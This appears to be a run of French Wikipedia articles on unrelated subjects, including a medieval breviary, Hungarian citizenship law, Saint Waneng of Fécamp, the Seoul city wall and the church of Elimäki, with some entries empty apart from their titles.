Par la suite, le manuscrit d'été se retrouve en possession de Robert Harley, d'Oxford et de son fils Edward Harley, comme l'indique une inscription de leur bibliothécaire datée du . Sa collection est léguée à la nation anglaise constituant le fond original du British Museum. Le volume d'hiver, d'après les annotations contenues dans le manuscrit, est donné par un chanoine de l'église Saint-Jacques d'Anvers appelé D. Verplanken à l'abbaye cistercienne Saint-Bernard de Hemiksem à proximité d'Anvers. Il est en possession de Ferdinand de Rothschild lorsque celui-ci le lègue à la British Library en 1898.
Description.
Le manuscrit d'été, dans la partie du bréviaire (f.154 à 452), contient 1 grande miniature, représentant l'Ascension du Christ, avec des marges complètement décorées (f.188v.), 56 petites miniatures sur une seule colonne, 14 grandes lettrines historiées et de nombreuses lettrines ornées. Elles ont été complétées dans la partie psautier, du calendrier et de la liturgie des saints (f.1 à 153), par 7 petites miniatures, de grandes lettrines pour les initiales KL des pages du calendrier, ainsi que de nombreuses petites lettrines ornée. 
Le manuscrit d'hiver comprend 1 grande miniature sur 2 colonne, représentant une Crucifixion (f.333v), 63 petites miniatures sur 1 colonne et 14 grandes lettrines historiées. 
Influences.
Le travail du Maître du Bréviaire révèle ici l'influence de manuscrits peints pour Jean de Berry : la crucifixion du manuscrit d'hiver est inspirée de celle des Très Belles Heures du duc de Berry peinte par Jacquemart de Hesdin, manuscrit auquel le maître anonyme sans doute a participé. D'autres motifs sont tirés des miniatures peintes par les frères de Limbourg pour les Très Belles Heures de Notre-Dame.

</doc>
<doc id="7278197" url="https://fr.wikipedia.org/wiki?curid=7278197" title="Poignée de porte">
Poignée de porte



</doc>
<doc id="7278199" url="https://fr.wikipedia.org/wiki?curid=7278199" title="Toulon Voiles de Légende 2007">
Toulon Voiles de Légende 2007

Toulon Voiles de Légende 2007 fut un rassemblement de grands voiliers organisé dans la rade de Toulon, en mer Méditerranée durant la première édition de la "Mediterranean Tall Ships Regatta 2007". C'est une des éditions de l'événement Toulon Voiles de Légende.
Présentation.
Le port de Toulon accueillit pour la première fois une étape de la Tall Ships' Races du 21 au .
Cette course de grands voiliers démarra le de Barcelone (Espagne) pour arriver le à Alicante (Espagne), avec une étape à Gênes (Italie) et l'autre à Toulon.
L'escale toulonnaise de cette course de grands voiliers a rencontré un grand succès : 38 voiliers présents, sur 4 jours, village d'animations et d'expositions sur les quais.
Bateaux présents en 2007.
Classement des bateaux selon la STI (Sail Training International).
Classe A.
Voiliers à phares carrés et autres de plus de de longueur de coque.
Classe C.
Voiliers à gréement moderne sans spinnaker, idem Classe B.
Classe D.
Voiliers à gréement moderne avec spinnaker, idem Classe B.
Voir aussi.
Articles connexes.
Autres manifestations dans le monde :

</doc>
<doc id="7278200" url="https://fr.wikipedia.org/wiki?curid=7278200" title="New Boots and Panties !!">
New Boots and Panties !!



</doc>
<doc id="7278203" url="https://fr.wikipedia.org/wiki?curid=7278203" title="John Stanley (auteur)">
John Stanley (auteur)

John Stanley (né le à Harlem et mort le à Sleepy Hollow) est un auteur de bande dessinée américain. Il est principalement connu pour son travail de scénariste et de dessinateur occasionnel sur "Petite Lulu" de 1945 à 1959. Célébré par Fred Hembeck ou C. C. Beck, il a créé ou animé de nombreuses séries humoristiques dans les années 1930 à 1960. Dans les années 1970, alors qu'il se dirige vers la publicité, il commence par être célébré par les amateurs de bande dessinée américains.
Biographie.
John Stanley naît le à Harlem d'émigrants irlandais. Après des études à l', il travaille dans les années 1930 pour les studios Fleischer puis pour Disney où il s'occupe du design et dessine des histoires pour le journal de Mickey. Il livre aussi des gags pour des magazines comme '. Lorsque la seconde guerre mondiale éclate, il ne part pas sous les drapeaux car il avait eu la tuberculose étant enfant et ses poumons étaient toujours affaiblis. Aussi en 1942, il est engagé par Western Publishing qui est un sous-traitant de l'éditeure Dell Comics. Là il dessine des histoires de "Bugs Bunny", "O.G. Whiz", "Linda Lark", "Woody Woodpecker" ou "Raggedy Ann and Andy". Il est aussi scénariste et signe les aventures de Porky Pig en comics. Une des séries sur lesquelles il travaille le plus longtemps est "Nancy and Sluggo" inspirée du comic strip d'Ernie Bushmiller, qu'il scénarise et dessine. Il crée aussi ' et "". Même s'il signe plutôt des séries enfantines ou humorisitques, son talent ne s'arrête pas là et pour Dell il scénarise le comics d'horreur "Tales from the Tomb" et écrit une des histoires les plus effrayantes dans ce genre pour Dell, intitulée "The Monster of Dread End" dans le premier numéro de "Ghost Stories" en 1962. Dès le début des années 1940, il travaille aussi sur le oomic book "Little Lulu" d'après le strip créé par Marge. Dans un premier temps il écrit les scénarios et prépare les planches qui sont finalisées par d'autres artistes comme Irving Tripp mais par la suite il prend en charge aussi cette partie. Il parvient à rendre ces personnages enfantins crédibles et le jeune lectorat peut s'y retrouver. C'est ainsi que les comics mettant en scènes Little Lulu, "Marge’s Little Lulu" et "Marge’s Tubby" se vendent à plus d'un million d'exemplaires par numéros. Dans les années 1960 il quitte le monde des comics et travaille pour une société spécialisée dans la sérigraphie. Il meurt le .
Critiques.
Le travail de John Stanley se caractérise par un goût pour le macabre. Il est aussi empreint d'un humour efficace reconnu par ses pairs comme Fred Hembeck qui disait de lui qu'il était ou Dave Noonan qui le considérait comme .

</doc>
<doc id="7278211" url="https://fr.wikipedia.org/wiki?curid=7278211" title="Frédéric Tonolli">
Frédéric Tonolli

Frédéric Tonolli, né à Clamart le , est un cadreur, réalisateur de documentaires et écrivain français. 
Biographie.
Né d'un père italien et d'une mère arménienne, Frédéric Tonolli a passé la majeure partie de son enfance à Villebon sur Yvette, commune dans laquelle il réside toujours. Il est marié, père de trois enfants et grand-père d'un petit-fils. 
Frédéric Tonolli a filmé et réalisé de nombreux documentaires pour les chaînes publiques de la télévision française, collaborant en outre à des émissions comme "Faut pas rêver", "Thalassa" ou "Envoyé spécial". 
Il a reçu le Prix Albert-Londres en 1996 pour "Les Seigneurs de Behring". 
Il a réalisé pour France 5 en 2009 une série de documentaires de quatre épisodes intitulée "Le Secret des 7 sœurs" retraçant près d'un siècle de géopolitique du pétrole, de la Norvège à l'Irak. 
De 2011 à 2014, il a réalisé une nouvelle série de quatre documentaires sur des histoires d'amour dans des villes en guerre : "Sarajevo, mon amour" conte la romance tragique entre un serbe et une bosniaque, "Berlin, mon amour" est l'histoire d'un couple séparé par le Mur de Berlin, "Bagdad, mon amour "parle d'un soldat américain et d'une infirmière irakienne et "Belfast, mon amour" revient sur deux jeunes amoureux catholiques d'Irlande du Nord.

</doc>
<doc id="7278212" url="https://fr.wikipedia.org/wiki?curid=7278212" title="Box-office Canada et États-Unis 2013 - 1er Week End">
Box-office Canada et États-Unis 2013 - 1er Week End

Voici des films sortis en 2013 et ayant dépassé lors de leur première sortie du week-end.
Sur fond jaune : Films classés numéro un lors de leur premier Week End.

</doc>
<doc id="7278213" url="https://fr.wikipedia.org/wiki?curid=7278213" title="Sitotroga cerealella">
Sitotroga cerealella



</doc>
<doc id="7278232" url="https://fr.wikipedia.org/wiki?curid=7278232" title="Supercoupe des Pays-Bas de football 2012">
Supercoupe des Pays-Bas de football 2012

La Supercoupe des Pays-Bas 2012 () est la vingt-troisième édition de la Supercoupe des Pays-Bas, épreuve qui oppose le champion des Pays-Bas au vainqueur de la Coupe des Pays-Bas. Disputée le à l'Amsterdam ArenA devant spectateurs, la rencontre est remportée par le PSV Eindhoven aux dépens de l'Ajax Amsterdam.

</doc>
<doc id="7278235" url="https://fr.wikipedia.org/wiki?curid=7278235" title="Église Saint-Martin de Trujillo">
Église Saint-Martin de Trujillo

L'église Saint-Martin est une église catholique de la ville espagnole de Trujillo (Estrémadure) située dans un angle de la "Plaza Mayor" de la ville.
Présentation.
Sa construction a commencé au et s'est poursuivie pendant plus d'un siècle. Elle s'est achevée dans la seconde moitié du , vers 1564, après que le plan initial eut subi des modifications importantes.
Ainsi, les caractéristiques architecturales sont spécifiques au gothique pour ce qui concerne le corps et la structure principale de l'église et à l'architecture de la Renaissance pour ce qui est des travaux effectués à la dernière étape de la construction. L'église possède une seule grande nef réalisée en pierre de taille et est couverte de croisées d'ogives étoilées. Des chapelles sont situées entre les contreforts dont la partie supérieure est visible de l'extérieur.
On trouve des documents écrits sur les interventions de l'architecte Sancho de Cabrera, qui a travaillé à la nef, à la tour et au chœur.
On trouve à l'intérieur d'importants tombeaux de style Renaissance appartenant à diverses familles de la ville. On trouve également un orgue historique baroque du .
L'extérieur est dominé par le grand volume de sa structure en pierre solide sur des gradins. La façade est constituée d'un portail simple de la Renaissance, situé entre une simple tour à base carrée d'un côté et une fine tourelle polygonale à horloge de l'autre, tourelle qui est ouverte dans le haut et surmontée d'une flèche pyramidale.

</doc>
<doc id="7278237" url="https://fr.wikipedia.org/wiki?curid=7278237" title="Quittard">
Quittard



</doc>
<doc id="7278242" url="https://fr.wikipedia.org/wiki?curid=7278242" title="Bostryche des grains">
Bostryche des grains



</doc>
<doc id="7278252" url="https://fr.wikipedia.org/wiki?curid=7278252" title="Jean-Jacques Latouche">
Jean-Jacques Latouche



</doc>
<doc id="7278253" url="https://fr.wikipedia.org/wiki?curid=7278253" title="Will Cahloun">
Will Cahloun



</doc>
<doc id="7278260" url="https://fr.wikipedia.org/wiki?curid=7278260" title="Citoyenneté hongroise">
Citoyenneté hongroise

La citoyenneté hongroise (en hongrois : ') est le fait d'être ressortissant de l'État hongrois. Le droit associé est principalement fondé sur le droit du sang (en latin : ') plutôt que sur le droit du sol.
Citoyenneté et nationalité.
Le droit hongrois et la langue courante hongroise ne confondent pas
À l'intérieur du pays, on peut ainsi être de citoyenneté hongroise ('), sans être de nationalité hongroise (', voir à ce sujet le cadre juridique des groupes linguistiques et culturels minoritaires). Hors des frontières, de nombreux citoyens roumains, slovaques, serbes, autrichiens, ukrainiens ou encore slovènes, ayant pour point commun de se revendiquer Hongrois d'outre-frontières, appartiennent à la nationalité hongroise sans pour autant être citoyens de Hongrie. Parmi eux, les ressortissants des autres États membres de l'Union européenne disposent de certains droits relatifs à leur statut de résident.
La citoyenneté hongroise est fondée sur la loi LV de 1993, entrée en vigueur le et plusieurs fois modifiée. Celle-ci énonce le principe de l'absence de distinction entre ressortissants hongrois selon qu'il y ait eu « génération » (') ou « obtention » (') de la citoyenneté, c'est-à-dire selon que celle-ci résulte de la naissance ou d'une naturalisation. Nul ne peut être arbitrairement privé de sa citoyenneté, ni du droit de changer de citoyenneté. En ce qui concerne la liberté de l’individu, la loi favorise l’unité de la famille et la réduction des cas d’apatridie, et garantit la protection des données à caractère personnel.
Citoyenneté à la naissance.
Le droit du sang s'exprime par le fait qu'est citoyen hongrois tout enfant né d'un citoyen hongrois, principe fixé au niveau constitutionnel par la constitution de 2012.
Naturalisation.
La naturalisation peut être obtenue sur demande, à condition que celle-ci ne porte pas atteinte à la sécurité publique, et que le demandeur dispose d'un casier judiciaire vierge, d'un domicile et de moyens de subsistance en Hongrie, réussisse un examen en hongrois portant sur les notions constitutionnelles de base (non exigé des personnes mineures, incapables, titulaires d'un diplôme de l'enseignement hongrois, ou âgées de plus de 60 ans), et réside en Hongrie sans interruption depuis :
La naturalisation est effective après prestation du serment suivant : « Je jure de considérer la Hongrie comme ma patrie, d'être un citoyen fidèle de la Hongrie, de respecter et suivre la Loi fondamentale et la législation, de défendre ma patrie en proportion de mes forces et de la servir selon mes capacités. [Que Dieu m'y aide !] ».
La naturalisation est facilitée en cas de citoyenneté hongroise antérieure : dans ce cas, outre les conditions que la naturalisation ne porte pas atteinte à la sécurité publique et que le demandeur dispose d'un casier judiciaire vierge, il est uniquement demandé de justifier de la connaissance du hongrois ; autrement dit, il n'est plus demandé de moyens de subsistance, domicile et durée de résidence en Hongrie, et l'examen sur les notions constitutionnelles est remplacé par la justification de la connaissance du hongrois. Pour les personnes privées de leur citoyenneté hongroise entre le et le , la naturalisation est encore davantage facilitée et prend la forme d'une simple déclaration.
Les mêmes conditions simplifiées qu'en cas de citoyenneté hongroise antérieure s'appliquent au conjoint d'un citoyen hongrois depuis au moins dix ans, ou depuis au moins cinq ans lorsqu'il est né un enfant de ce mariage.
Naturalisation facilitée par l'origine hongroise.
Les mêmes conditions simplifiées qu'en cas de citoyenneté hongroise antérieure s'appliquent également au descendant d'un citoyen hongrois ou d'une personne dont on peut présumer avec vraisemblance qu'elle est originaire de Hongrie.
La « nationalité » culturelle ou sociologique, c'est-à-dire le sentiment d'appartenance à la culture hongroise ou au peuple hongrois, et la magyarophonie, le fait de s'exprimer en langue hongroise, ne sont pas strictement identiques à cette « origine » définie par l'existence d'un ascendant qui soit citoyen hongrois ou né en Hongrie de l'époque. Cependant, il est clair que les membres de la « nation » hongroise dans les pays voisins, c'est-à-dire les Hongrois ethniques des localités faisant autrefois partie de la Hongrie, voient leur naturalisation facilitée par l'absence de condition de résidence en Hongrie, et par le fait qu'à la place de l'examen il suffit de montrer que l'on parle hongrois. Par contre, cela ne leur donne pas le droit de vote en Hongrie, qui suppose la résidence en Hongrie (sauf, depuis les législatives de 2014, au scrutin sur liste nationale des partis qui élit 93 des 199 députés), ni le passeport hongrois, qui nécessite une démarche séparée après la naturalisation, et cela ne leur donne pas non plus la citoyenneté hongroise à tous, mais seulement à ceux qui la demandent.
Cette disposition, qui résulte d'une loi modificative de 2010, a été considérée par la Slovaquie comme une provocation, dans le contexte des relations difficiles entre la Hongrie et la Slovaquie, et la Slovaquie a immédiatement légiféré afin de retirer la citoyenneté slovaque à qui en obtiendrait une autre. Cependant en 2012, seuls quelques dizaines de Hongrois de Slovaquie avaient ainsi perdu leur citoyenneté slovaque : exactement 23 personnes entre le , date d'entrée en vigueur de la loi slovaque, et le .
Perte de la citoyenneté.
En dehors du cas où une personne disposant également d'une autre citoyenneté renonce volontairement à la citoyenneté hongroise, celle-ci ne peut être retirée qu'en cas de naturalisation illégitime, par exemple frauduleuse, et uniquement pendant les dix ans suivant la naturalisation.
Droits associés à la citoyenneté.
Dispose des droits de citoyen en Hongrie celui ou celle qui possède un titre de séjour légal sur le territoire (dans la limite des droits particuliers qui les interdisent ou autorisent, tels ceux encadrant le vote aux élections locales ou nationales).
Par ailleurs, même si leur accès à la citoyenneté est automatique et certifié par les documents de type passeport ou carte d'identité, les enfants mineurs nés d'un parent étranger doivent être accompagnés de leur tuteur légal pour disposer de leurs pleins droits juridiques.

</doc>
<doc id="7278262" url="https://fr.wikipedia.org/wiki?curid=7278262" title="Waneng de Fécamp">
Waneng de Fécamp

Waneng (ou Waning) de Fécamp, né au début du et décédé en 686, est le fondateur de l’abbaye de Fécamp en Seine-Maritime. Il est reconnu saint par l'Église catholique.
Biographie.
Waneng naquit au tout début du , sous le règne de Clotaire II, dans le diocèse de Rouen. Issu d’une famille noble, il fut élevé dès son plus jeune âge dans la foi chrétienne et embrassa la carrière des armes.
Il se lia d’amitié avec Ouen, archevêque de Rouen, Wandrille, abbé de Fontenelle et plaça sa vie sous le patronage et la protection de Sainte Eulalie de Mérida. Cependant il se maria et eut un fils, Désiré, qui se retira à l’âge adulte à l’abbaye de Fontenelle.
Fondateur de l'Abbaye de Fécamp.
Waneng reçut du roi Clotaire III, l’administration du Pays de Caux dans lequel il fonda l’abbaye de Fécamp. L'abbaye fut rapidement construite; le roi la dota magnifiquement. Elle compta jusqu’à trois cent soixante-six religieuses. Elle fut placée à l’origine sous la tutelle d’Ouen et de Wandrille. La première abbesse de ce monastère fut sainte Hildemarque ou Childemarque, qui, venue de Bordeaux où elle avait dirigé une communauté religieuse, vivait alors dans le diocèse de Rouen.
La colère d'Ebroïn.
Waneng dut affronter le courroux du maire du palais, Ébroïn. Depuis longtemps, celui-ci s'était opposé à Léger d'Autun, conseiller de la reine Bathilde. Après qu'il l'eût fait arrêter, Ebroïn ordonna qu'on le conduisît au château de Waneng, auquel il avait fait des recommandations. Mais Waneng traita Léger d'Autun avec bienveillance. Ebroïn mécontent, se saisit de Léger, le fit martyriser et exécuter.
Waneng se retira alors à l'abbaye de Fécamp, où il se mit au rang des serviteurs de la maison voulant finir là ses jours, dans l'humilité et la prière. Il mourut à Fécamp en 686.
Reliques et culte de Saint Waneng.
Après sa mort, les reliques de Saint Waneng furent conservées à Fécamp. Ce fut pendant les incursions des Vikings que les reliques de saint Waneng furent transportées à Ham, en Picardie. 
Elles avaient d'abord été déposées dans un lieu appelé Mesnil-Saint-Waneng, hameau dépendant de la paroisse d'Esmery-Hallon près de Ham. Ce lieu aurait appartenu à saint Waneng; il y aurait possédé un château et y serait venu de temps à autre y pour chasser. 
Les Vikings, ayant envahi le Vermandois, pillèrent le Mesnil, détruisirent la châsse de saint Waneng et jetèrent ses reliques dans les marais. Des habitants les recueillirent précieusement, les conservèrent puis elles furent transférées à Ham. 
La ville de Ham prit saint Waneng pour saint patron, on ne sait au juste à quelle époque. On célébra sa fête d'abord à l'abbaye longtemps avant de la célébrer dans la ville. Ce fut seulement en 1516 que Hangest, évêque de Noyon, accorda la permission aux habitants, de célébrer l'office de saint Waneng. La commune d'Esmery-Hallon avait aussi pris saint Waneng pour saint patron; elle célébrait sa fête en même temps que la ville de Ham, et en 
outre, le , elle célébrait une nouvelle fête, celle de la translation d'une relique de Saint Waneng.

</doc>
<doc id="7278264" url="https://fr.wikipedia.org/wiki?curid=7278264" title="Dipladénia de Sander">
Dipladénia de Sander



</doc>
<doc id="7278275" url="https://fr.wikipedia.org/wiki?curid=7278275" title="Pivoine (roman)">
Pivoine (roman)

Pivoine ("Peony") est un roman historique de la romancière américaine Pearl Buck, publié en 1948
Résumé.
Au milieu du , au nord de la Chine, Pivoine, est une jeune esclave, aussi belle que sage, achetée enfant par la famille Ezra pour tenir compagnie à leur fils David, 19 ans. Les Ezra sont de riches commerçants juifs installés en Chine depuis plusieurs générations. Mais Ezra Père est de mère chinoise, tandis que sa femme Naomi est une juive ardente, dévorée par le désir de voir son peuple observer la Thora, rester un et espérer sans relâche le retour vers la Terre promise. Ils logent Leah, fille du rabbin, promise à David selon une promesse échangée par leurs mères à la naissance. 
Chaque année, une caravane de chameaux approvisionne le comptoir d'Ezra. Le caravanier dit qu'en Europe, les juifs sont massacrés. David apprend que les juifs sont haïs, car ils se sont déclarés « élus » de Dieu (Jehovah). Leah n'arrive pas à se faire aimer de David. Elle le blesse et se suicide. David épouse Kueilan. Après l'avoir vue, les impératrices de Chine veulent acheter Pivoine, mais elle et David refusent. Pivoine se fait nonne. Kueilan rappelle Pivoine, car son ainé se meurt ; elle le guérit. Un chrétien achète les deux dernières pierres de la synagogue. Pivoine lui demande de les mettre dans un pavillon pour qu'Israel vive toujours parmi les Chinois.

</doc>
<doc id="7278281" url="https://fr.wikipedia.org/wiki?curid=7278281" title="Ehret">
Ehret



</doc>
<doc id="7278302" url="https://fr.wikipedia.org/wiki?curid=7278302" title="Tour Montfromery">
Tour Montfromery

La Tour Montfromery (de Montfrommery ou Montframmery) est une tour médiévale située à Fougères, en France.
Localisation.
Elle est située à l'entrée de la ruelle des Vaux et est longée sur son flanc nord par le boulevard de Rennes.
Histoire.
Datant du , cette grosse tour ronde fait partie de l'enceinte fortifiée de la ville haute, délimitant à l'orient la section septentrionale des remparts. Son appréhension visuelle a été faussée par la création du boulevard de Rennes au début du ainsi que par la suppression des éléments défensifs qui la couronnaient. Elle porte le nom d'un connétable de la ville, de Beaucé de Montframmery, actif en 1473. Appelée également Tour Saint-Jacques et jouxtant autrefois une poterne dénommée Four d'Enfer, elle joint par sa courtine ouest la Tour Desnos tandis que celle méridionale conduisait autrefois à la Porte Roger disparue depuis 1770. Lors du siège de Fougères de 1488, une brèche sera ouverte en ses murs par l'artillerie des assiégeants, conduisant à la reddition de la place. Propriété d'un particulier, comme la majeure partie des remparts de la ville subsistants, elle vient d'être restaurée. La Tour Montfromery a été inscrite à l'inventaire supplémentaire des monuments historiques le .

</doc>
<doc id="7278303" url="https://fr.wikipedia.org/wiki?curid=7278303" title="Lucas Moser">
Lucas Moser



</doc>
<doc id="7278305" url="https://fr.wikipedia.org/wiki?curid=7278305" title="Loqueteau">
Loqueteau



</doc>
<doc id="7278310" url="https://fr.wikipedia.org/wiki?curid=7278310" title="Micro-électronique">
Micro-électronique



</doc>
<doc id="7278319" url="https://fr.wikipedia.org/wiki?curid=7278319" title="Jakavi">
Jakavi



</doc>
<doc id="7278324" url="https://fr.wikipedia.org/wiki?curid=7278324" title="Pierre-Michel Menger">
Pierre-Michel Menger

Pierre-Michel Menger, né le à Forbach, est un sociologue français, professeur au Collège de France depuis , et membre de l'Académie des sciences morales et politiques depuis .
Ses recherches interdisciplinaires portent sur le travail créateur, dans un ensemble de domaines tels que l’art, la science, l’entreprise et le sport. Il s’intéresse également à l’usage de données quantitatives, en particulier aux méthodes relevant du big data.
Biographie.
Jeunesse et études.
Formé à la philosophie à l’École normale supérieure de la rue d'Ulm (promotion L1973), puis à la sociologie à l’École des hautes études en sciences sociales (EHESS), Pierre-Michel Menger y prépare son doctorat sous la direction de Raymonde Moulin. Il achève sa thèse à la fondation Thiers.
Parcours professionnel.
Il entre au CNRS comme attaché de recherche en 1978, puis comme chargé de recherches en 1983. Il commence également à enseigner à l'EHESS en 1985, devient directeur de recherches au CNRS en 1990 et directeur d'études à l'EHESS en 1993.
De 1993 à 2005, il dirige le Centre de sociologie du travail et des arts (EHESS/CNRS) et enseigne pendant plusieurs années à l'Institut d'études politiques de Paris (1992-1995, 1999-2004). Il a été chercheur invité à l'Institut d'études avancées de Berlin (2006-2007) et à l'université Columbia (2008, 2010, 2011). Il est aujourd'hui professeur au Collège de France, directeur d'études à l'EHESS, membre du Centre d'études sociologiques et politiques Raymond Aron (EHESS), membre du comité de rédaction de la "Revue française de sociologie" et du conseil scientifique de la "Revue économique".
Analyse de l'œuvre.
Pierre-Michel Menger est l’auteur de nombreux articles et ouvrages consacrés aux métiers de l’art et de la science, ainsi qu’aux méthodes des sciences sociales et à l’usage des big data. Parmi ses ouvrages, traduits en plusieurs langues, figurent "Le Travail créateur. S'accomplir dans l'incertain" (2009) et "Portrait de l’artiste en travailleur. Métamorphoses du capitalisme" (2003).
Ses travaux analysent ce que les situations d’incertitude font aux mondes sociaux et aux individus : puisant dans l’histoire de l’art, l’économie et la psychologie, il développe une perspective analytique de l’agir social, articulant études de cas et analyses quantitatives. Depuis 2013, il a consacré différents cours au travail créateur, à la production du savoir scientifique, au talent ainsi qu’à la notion d’achèvement.

</doc>
<doc id="7278325" url="https://fr.wikipedia.org/wiki?curid=7278325" title="Liste des rois des Hellènes">
Liste des rois des Hellènes



</doc>
<doc id="7278337" url="https://fr.wikipedia.org/wiki?curid=7278337" title="Liste des reines de Grèce">
Liste des reines de Grèce



</doc>
<doc id="7278344" url="https://fr.wikipedia.org/wiki?curid=7278344" title="Macbeth (téléfilm, 1979)">
Macbeth (téléfilm, 1979)

Macbeth est un téléfilm britannique, réalisé par Philip Casson et diffusé à la télévision sur ITV en 1979.

</doc>
<doc id="7278348" url="https://fr.wikipedia.org/wiki?curid=7278348" title="Drood (roman)">
Drood (roman)

Drood (titre original : "") est un roman de l'écrivain américain Dan Simmons publié en 2009. 
Thème du roman et publication.
Le roman revient sur les cinq dernières années de la vie de l'écrivain britannique Charles Dickens, racontées par son ami Wilkie Collins, lui-même écrivain britannique. Le titre est inspiré du roman que Dickens n'a pas eu le temps de terminer avant sa mort, "Le Mystère d'Edwin Drood". Dan Simmons combine réalité historique (certains faits connus de la vie de Charles Dickens et de Wilkie Collins), et fantastique, comblant les zones d'ombre des cinq dernières années de la vie de Dickens.
Le roman a fait l'objet d'une traduction française effectuée par Odile Demange et parue en aux éditions Robert Laffont.
Résumé.
Le , le célèbre écrivain britannique Charles Dickens frôle la mort lors d'un accident ferroviaire dans lequel la locomotive et plusieurs wagons du train le ramenant à Londres tombèrent d'un viaduc, causant de nombreux morts et blessés. L'écrivain a le bonheur de se trouver dans le premier des wagons qui ne tombe pas mais a le malheur de rencontrer, pendant qu'il portait secours aux blessés, un homme nommé Drood. Persuadé qu'il a rencontré un assassin, l'écrivain est pris d'une fascination morbide et va n'avoir de cesse d'essayer de le retrouver. Entraînant son collègue romancier Wilkie Collins dans ses recherches, ils vont parcourir ensemble les chemins souterrains parsemant le sous-sol de Londres, y découvrant l'équivalent d'une ville. La rencontre de Charles Dickens et de Drood sera déterminante pour les cinq dernières années de la vie de l'écrivain et lui inspirera son dernier roman resté inachevé, "Le Mystère d'Edwin Drood".
Distinctions.
"Drood" a été nommé au prix Locus du meilleur roman de fantasy 2010, terminant à la troisième place.

</doc>
<doc id="7278349" url="https://fr.wikipedia.org/wiki?curid=7278349" title="Gueorgui Milliar">
Gueorgui Milliar

Gueorgui Frantsevitch Milliar (en ), né le à Moscou en Russie et mort le à Moscou) est un acteur soviétique russe.
Biographie.
Gueorgui Milliar naît le à Moscou en Russie. Il est le fils de Franz de Milieu, un constructeur de ponts français, originaire de Marseille, travaillant en Russie et d'Elizaveta Jouravliova, elle-même fille d'un mineur d'Irkoutsk. Le père de Gueorgui meurt alors qu'il a à peine trois ans. Sa mère déménage à Guelendjik. Après la révolution d'octobre, la mère de Gueorgui change leur nom de famille en Milliar et en supprime la particule afin d'éviter des ennuis avec les bolchéviques.
Gueorgui travaille au théâtre de Guelendjik. Il fait ses débuts sur scène par hasard en 1920, pour remplacer au dernier moment un acteur malade. C'est un succès, et, peu à peu, il devient un acteur connu en province. Il part ensuite étudier et travailler à Moscou au Théâtre de la Révolution, l'actuel théâtre Maïakovski, et poursuit sa carrière d'acteur de théâtre.
En 1938, le réalisateur Alexandre Rou propose à Gueorgui Milliar un rôle dans son film "De par la Volonté du Brochet" (По щучьему веленью, "Po chtchoutchemou veleniou"). C'est le début d'une collaboration et d'une amitié de trente ans, au cours desquels Milliar joue des rôles importants dans une trentaine de films, souvent des personnages merveilleux, démons, sorciers et même la sorcière Baba Yaga. Il participe également au doublage de nombreux films et dessins animés.
Gueorgui Milliar meurt le à Moscou, à l'âge de 89 ans.

</doc>
<doc id="7278373" url="https://fr.wikipedia.org/wiki?curid=7278373" title="Muraille de Séoul">
Muraille de Séoul

La Muraille de Séoul (en Hangeul: 서울성곽, "Seoul Seonggwak"), ou "Hanyang Doseong" (en Hangeul: 한양도성, en Hanja: 漢陽都城), est un mur d'enceinte construit par le roi Taejo en 1396 autour de la ville d'Hanyang, aujourd'hui Séoul. La muraille, longue de 18 kilomètres, comporte huit portes : quatre principales qui sont Sukjeongmun, Donuimun, Sungnyemun et Heunginjimun et quatre secondaires. Aujourd'hui, il reste 12 kilomètres de muraille et six des huit portes.
Histoire.
En 1392, Yi Seong-gye renverse le royaume de Goryeo et devient le roi Taejo, premier roi de la dynastie Joseon (1392-1897). Il décide en 1395 de faire de Hanyang (한양/漢陽), aujourd'hui Séoul (서울), la nouvelle capitale du royaume. La cité, située au Nord du fleuve Han, est agencée selon l'art du "Feng Shui".
Afin de protéger la nouvelle capitale et son palais, le roi ordonne la construction d'une muraille faisant le tour de la ville. La construction débute en 1396, mobilise près de deux cent mille hommes et dure 98 jours. La muraille, d'une circonférence totale de 18 km, s'étend du mont Bugaksan, au Nord, jusqu'au mont Namsan, au Sud.
La muraille comporte quatre portes principales et quatre portes secondaires disposées selon les différents points cardinaux. Ainsi les quatre grandes portes sont Sukjeongmun au Nord, Sungnyemun au Sud, Heunginjimun à l'Est et Donuimun à l'Ouest. Et les quatre petites portes sont Hyehwamun au Nord-Est, Gwanghuimun au Sud-Est, Souimun au Sud-Ouest et Changuimun au Nord-Ouest.
En 1422, le roi Sejong le Grand, lance une grande rénovation de la forteresse. 
Durant l'occupation japonaise (1910-1945), les portes Sud-Ouest, Ouest et Nord-Est sont détruites respectivement en 1914, 1915 et 1928. Seule la porte Nord-Est est restaurée en 1975.
Le 21 janvier 1963, le site fut déclaré site historique de la Corée du Sud n°10.
Le , la grande porte Sud de Sungnyemun est réduite en cendres par un pyromane. En , débute alors un grand projet de rénovation afin de reconstruire l'édifice. Après trois années de travaux, le porte ouvre de nouveau au public en .
En , l'UNESCO accepte d'étudier la demande du gouvernement sud-coréen concernant l'inscription de la muraille au patrimoine mondial.

</doc>
<doc id="7278383" url="https://fr.wikipedia.org/wiki?curid=7278383" title="Brad Johnson (acteur)">
Brad Johnson (acteur)

Brad William Johnson, né le à Tucson, Arizona et mort le à Fort Worth, Texas, est un acteur américain et ancien Marlboro Man.
Biographie.
Le premier rôle de Brad Johnson au cinéma figure dans un film de motards à petit budget "The Angels Nam" (1989), et la même année, il obtient son premier rôle de covedette dans un film majeur quand il joue le rôle de Ted Baker dans "Always", dirigé par Steven Spielberg. Ses autres films incluent "Le Vol de l'Intruder", "Philadelphia Experiment II", ou encore "Supergator".
Il a également joué le rôle de Rayford Steele dans la série "Left Behind", et a joué le docteur Dominick O'Malley dans la série "Melrose Place".
Il a six filles et quatre fils.
Il meurt le des suites de complications dues à la Covid-19.

</doc>
<doc id="7278389" url="https://fr.wikipedia.org/wiki?curid=7278389" title="Église d'Elimäki">
Église d'Elimäki

Léglise d'Elimäki (en ) est une église située dans le village Kerimäki de la commune de Kouvola en Finlande.
Histoire.
La zone d'Elimäki appartenait à la paroisse de Pyhtää. Le droit de patronage fut établi pour la famille Wrede en 1608, lorsqu'elle acquit le manoir.
L'église a été construite à l'origine en 1638 dans une forme rectangulaire, mais agrandie en église cruciforme en 1678.
Le bâtiment fait partie des installations de la paroisse d'Elimäki de la Congrégation paroissiale de Kouvola. Le bâtisseur de l'église est Petter Loman.
L'église d'Elimäki est la plus ancienne église en bois de Finlande, si l'année de construction transmise par la tradition orale est correcte.
Le drainage du lac Elimäenjärvi, ou Kirkkojärvi, peu profond et herbeux, a commencé dans les années 1860.
Dans les années 1910, l'assèchement du lac se poursuit à l'initiative du propriétaire du Manoir de Mustila.
Le lac a finalement été drainé et transformé en terres agricoles en 1948.
L'opération a donné 350 hectares de terres arables.
Description.
Le village d'Elimäki est situé sur la rive sud de l'Elimäenjärvi.
